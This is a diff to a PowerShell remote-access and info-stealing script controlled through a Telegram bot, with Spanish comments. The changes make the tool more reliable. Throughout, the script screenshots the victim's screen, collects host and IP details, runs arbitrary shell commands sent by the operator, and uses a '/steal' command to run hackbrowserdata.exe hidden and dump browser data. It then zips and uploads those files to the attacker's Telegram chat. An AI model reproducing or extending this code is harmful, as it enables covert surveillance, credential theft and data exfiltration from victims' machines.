@@ -6,6 +6,21 @@ param(
     [string]$ChatId
 )
 
+# === PREVENIR MULTIPLES INSTANCIAS ===
+$mutexName = "Global\TelegramBot_$($Token.Substring(0,10))"
+$mutex = New-Object System.Threading.Mutex($false, $mutexName)
+if (-not $mutex.WaitOne(0, $false)) {
+    Write-Host "[!] Bot ya esta corriendo. Saliendo..."
+    exit 1
+}
+
+# Liberar mutex al salir
+trap {
+    $mutex.ReleaseMutex()
+    $mutex.Dispose()
+    exit 1
+}
+
 $ErrorActionPreference = 'Continue'
 $ApiUrl = "https://api.telegram.org/bot$Token"
 $LogFile = Join-Path $env:APPDATA 'CarpetaDos\bot.log'
@@ -25,28 +40,32 @@ try {
     Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post -ErrorAction Stop | Out-Null
     Write-Log "Webhook desactivado"
     Start-Sleep -Seconds 3
+    
+    # Limpiar updates pendientes
+    $updates = Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=-1" -Method Get
+    if ($updates.result.Count -gt 0) {
+        $lastId = ($updates.result | Select-Object -Last 1).update_id
+        Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=$($lastId + 1)" -Method Get | Out-Null
+    }
 } catch {
-    Write-Log "Error desactivando webhook: $($_.Exception.Message)"
+    Write-Log "Error limpiando webhook: $($_.Exception.Message)"
 }
 
-Add-Type -AssemblyName System.Windows.Forms, System.Drawing, System.Net.Http
-
-$httpClient = New-Object System.Net.Http.HttpClient
+Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 
 function Send-Message {
     param([string]$Text, [string]$TargetChatId = $ChatId)
     try {
         if ($Text.Length -gt 4000) { $Text = $Text.Substring(0, 4000) + "`n...(truncado)" }
         
-        $json = @{chat_id=$TargetChatId; text=$Text} | ConvertTo-Json -Compress
-        $content = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
-        $response = $httpClient.PostAsync("$ApiUrl/sendMessage", $content).Result
+        $body = @{
+            chat_id = $TargetChatId
+            text = $Text
+        } | ConvertTo-Json -Compress
         
-        $content.Dispose()
-        if (-not $response.IsSuccessStatusCode) {
-            Write-Log "Error sendMessage: $($response.StatusCode)"
-        }
-        return $response.IsSuccessStatusCode
+        $response = Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $body
+        
+        return $true
     } catch {
         Write-Log "Error Send-Message: $($_.Exception.Message)"
         return $false
@@ -73,37 +92,42 @@ function Send-File {
             return $false
         }
         
-        # Crear contenido multipart correctamente para PowerShell 5.1
-        $content = New-Object System.Net.Http.MultipartFormDataContent
+        # Usar boundary unico
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $contentType = "multipart/form-data; boundary=$boundary"
         
-        # Agregar chat_id
-        $chatIdContent = New-Object System.Net.Http.StringContent($TargetChatId)
-        $content.Add($chatIdContent, "chat_id")
+        $sb = New-Object System.Text.StringBuilder
         
-        # Agregar caption si existe
+        # chat_id
+        [void]$sb.AppendLine("--$boundary")
+        [void]$sb.AppendLine("Content-Disposition: form-data; name=`"chat_id`"")
+        [void]$sb.AppendLine()
+        [void]$sb.AppendLine($TargetChatId)
+        
+        # caption (si existe)
         if ($Caption) {
-            $captionContent = New-Object System.Net.Http.StringContent($Caption)
-            $content.Add($captionContent, "caption")
+            [void]$sb.AppendLine("--$boundary")
+            [void]$sb.AppendLine("Content-Disposition: form-data; name=`"caption`"")
+            [void]$sb.AppendLine()
+            [void]$sb.AppendLine($Caption)
         }
         
-        # Agregar archivo
+        # archivo
+        [void]$sb.AppendLine("--$boundary")
+        [void]$sb.AppendLine("Content-Disposition: form-data; name=`"document`"; filename=`"$($fileInfo.Name)`"")
+        [void]$sb.AppendLine("Content-Type: application/octet-stream")
+        [void]$sb.AppendLine()
+        
+        $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($sb.ToString())
         $fileBytes = [System.IO.File]::ReadAllBytes($Path)
-        $fileContent = New-Object System.Net.Http.ByteArrayContent($fileBytes)
-        $fileContent.Headers.ContentDisposition = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue("form-data")
-        $fileContent.Headers.ContentDisposition.Name = "document"
-        $fileContent.Headers.ContentDisposition.FileName = $fileInfo.Name
-        $content.Add($fileContent, "document")
+        $footerBytes = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
         
-        # Enviar
-        $response = $httpClient.PostAsync("$ApiUrl/sendDocument", $content).Result
+        $totalBytes = New-Object byte[] ($headerBytes.Length + $fileBytes.Length + $footerBytes.Length)
+        [System.Buffer]::BlockCopy($headerBytes, 0, $totalBytes, 0, $headerBytes.Length)
+        [System.Buffer]::BlockCopy($fileBytes, 0, $totalBytes, $headerBytes.Length, $fileBytes.Length)
+        [System.Buffer]::BlockCopy($footerBytes, 0, $totalBytes, ($headerBytes.Length + $fileBytes.Length), $footerBytes.Length)
         
-        $content.Dispose()
-        
-        if (-not $response.IsSuccessStatusCode) {
-            $errorBody = $response.Content.ReadAsStringAsync().Result
-            Write-Log "Error enviando archivo $($fileInfo.Name): $($response.StatusCode) - $errorBody"
-            return $false
-        }
+        $response = Invoke-RestMethod -Uri "$ApiUrl/sendDocument" -Method Post -ContentType $contentType -Body $totalBytes
         
         Write-Log "Archivo enviado OK: $($fileInfo.Name)"
         return $true
@@ -118,28 +142,55 @@ function Get-Info {
     try {
         $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
     } catch { $ip = "Desconocida" }
-    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip"
+    
+    $os = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
+    if (-not $os) { $os = "Windows" }
+    
+    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip | OS: $os"
 }
 
 function Take-Screenshot {
+    $path = $null
     try {
         Add-Type -AssemblyName System.Windows.Forms, System.Drawing
         
         $screen = [System.Windows.Forms.Screen]::PrimaryScreen
-        $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
+        $bitmap = $null
+        $graphics = $null
         
-        $path = Join-Path $env:TEMP "screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
-        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
-        $graphics.Dispose()
-        $bitmap.Dispose()
+        try {
+            $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
+            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+            $graphics.CopyFromScreen(
+                $screen.Bounds.Location, 
+                [System.Drawing.Point]::Empty, 
+                $screen.Bounds.Size
+            )
+            
+            $path = Join-Path $env:TEMP "screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
+            
+            # Asegurar que el directorio existe
+            $dir = Split-Path $path -Parent
+            if (-not (Test-Path $dir)) {
+                New-Item -ItemType Directory -Path $dir -Force | Out-Null
+            }
+            
+            $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
+            
+            $result = Send-File -Path $path -Caption "Screenshot $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+            return $result
+            
+        } finally {
+            if ($graphics) { $graphics.Dispose() }
+            if ($bitmap) { $bitmap.Dispose() }
+            if ($path -and (Test-Path $path)) {
+                Remove-Item $path -Force -ErrorAction SilentlyContinue
+            }
+        }
         
-        $result = Send-File -Path $path -Caption "Screenshot $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-        Remove-Item $path -Force -ErrorAction SilentlyContinue
-        return $result
     } catch {
         Write-Log "Error screenshot: $($_.Exception.Message)"
+        Send-Message -Text "Error capturando: $($_.Exception.Message)"
         return $false
     }
 }
@@ -148,7 +199,7 @@ function Run-Steal {
     param([string]$TargetChatId = $ChatId)
     
     Send-Message -Text "Extrayendo datos..." -TargetChatId $TargetChatId
-    Write-Log "Iniciando extraccion"
+    Write-Log "Iniciando extraccion de navegadores"
     
     if (-not (Test-Path $HackPath)) {
         Send-Message -Text "Error: hackbrowserdata.exe no encontrado" -TargetChatId $TargetChatId
@@ -159,27 +210,32 @@ function Run-Steal {
     New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
     
     try {
-        # Ejecutar SIN --zip para obtener archivos sueltos
         $psi = New-Object System.Diagnostics.ProcessStartInfo
         $psi.FileName = $HackPath
         $psi.Arguments = "dump -d `"$outputDir`" -f json"
         $psi.CreateNoWindow = $true
-        $psi.WindowStyle = 'Hidden'
+        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
         $psi.UseShellExecute = $false
         $psi.RedirectStandardOutput = $true
         $psi.RedirectStandardError = $true
         
         $proc = [System.Diagnostics.Process]::Start($psi)
-        $proc.WaitForExit(180000)
         
-        if (-not $proc.HasExited) {
+        # Esperar con timeout de 3 minutos
+        if (-not $proc.WaitForExit(180000)) {
             $proc.Kill()
+            Write-Log "Timeout - matando proceso hackbrowserdata"
             Send-Message -Text "Timeout en extraccion" -TargetChatId $TargetChatId
+            Remove-Item $outputDir -Recurse -Force -ErrorAction SilentlyContinue
             return
         }
         
+        $stdout = $proc.StandardOutput.ReadToEnd()
         $stderr = $proc.StandardError.ReadToEnd()
-        if ($stderr) { Write-Log "HackBrowserData: $stderr" }
+        
+        Write-Log "Exit code: $($proc.ExitCode)"
+        if ($stdout) { Write-Log "Stdout: $stdout" }
+        if ($stderr) { Write-Log "Stderr: $stderr" }
         
         # Buscar JSONs
         $jsonFiles = Get-ChildItem -Path $outputDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
@@ -203,14 +259,14 @@ function Run-Steal {
                 Compress-Archive -Path $json.FullName -DestinationPath $zipPath -Force -CompressionLevel Optimal
                 
                 # Renombrar caption (quitar .json)
-                $caption = $json.BaseName  # Esto quita la extension .json
+                $caption = $json.BaseName
                 
                 if (Send-File -Path $zipPath -Caption $caption -TargetChatId $TargetChatId) {
                     $sent++
                 }
                 
                 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-                Start-Sleep -Milliseconds 800  # Evitar rate limit
+                Start-Sleep -Milliseconds 1000  # Evitar rate limit
                 
             } catch {
                 Write-Log "Error procesando $($json.Name): $($_.Exception.Message)"
@@ -245,7 +301,6 @@ function Execute-Cmd {
         
         # Enviar como archivo
         if (Send-File -Path $tempFile -Caption "Resultado de: $Command" -TargetChatId $TargetChatId) {
-            # Enviar confirmacion breve
             $lines = $output -split "`n" | Where-Object { $_.Trim() } | Select-Object -First 3
             $preview = ($lines -join "`n")
             if ($preview.Length -gt 100) { $preview = $preview.Substring(0, 100) + "..." }
@@ -316,7 +371,7 @@ function Process-Command {
         { $_ -in 'captura', '/captura' } {
             Send-Message -Text "Capturando..."
             if (-not (Take-Screenshot)) {
-                Send-Message -Text "Error al capturar"
+                Send-Message -Text "Error al capturar pantalla"
             }
         }
         
@@ -331,7 +386,7 @@ Comandos:
 /cmd <comando> - Ejecutar (resultado en .txt)
 /cd <ruta> - Cambiar directorio
 /pwd - Directorio actual
-/steal - Extraer datos (cada archivo comprimido individual)
+/steal - Extraer datos navegadores
 /captura - Screenshot
 /info - Info del sistema
 /help - Esta ayuda
@@ -351,11 +406,15 @@ Write-Log "ChatId: $ChatId"
 Send-Message -Text "Bot online - $(Get-Info)"
 
 $lastUpdateId = 0
+$consecutiveErrors = 0
+$maxConsecutiveErrors = 10
 
 while ($true) {
     try {
-        $url = "$ApiUrl/getUpdates?offset=$($lastUpdateId + 1)&limit=5"
+        $url = "$ApiUrl/getUpdates?offset=$($lastUpdateId + 1)&limit=10"
         $response = Invoke-RestMethod -Uri $url -TimeoutSec 60
+        
+        $consecutiveErrors = 0
         
         if ($response.ok -and $response.result.Count -gt 0) {
             foreach ($update in $response.result) {
@@ -375,11 +434,24 @@ while ($true) {
         }
     } catch {
         $err = $_.Exception.Message
-        if ($err -notlike "*409*") {
+        $consecutiveErrors++
+        
+        if ($err -like "*409*") {
+            Write-Log "Error 409 (Conflicto) - Limpiando updates..."
+            try {
+                Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=-1" -TimeoutSec 10 | Out-Null
+                Start-Sleep -Seconds 5
+            } catch {}
+        } elseif ($consecutiveErrors -ge $maxConsecutiveErrors) {
+            Write-Log "Demasiados errores. Esperando 30s..."
+            Start-Sleep -Seconds 30
+            $consecutiveErrors = 0
+        } else {
             Write-Log "Error bucle: $err"
         }
-        Start-Sleep -Seconds 2
+        
+        Start-Sleep -Seconds 3
     }
     
-    Start-Sleep -Milliseconds 500
+    Start-Sleep -Milliseconds 800
 }
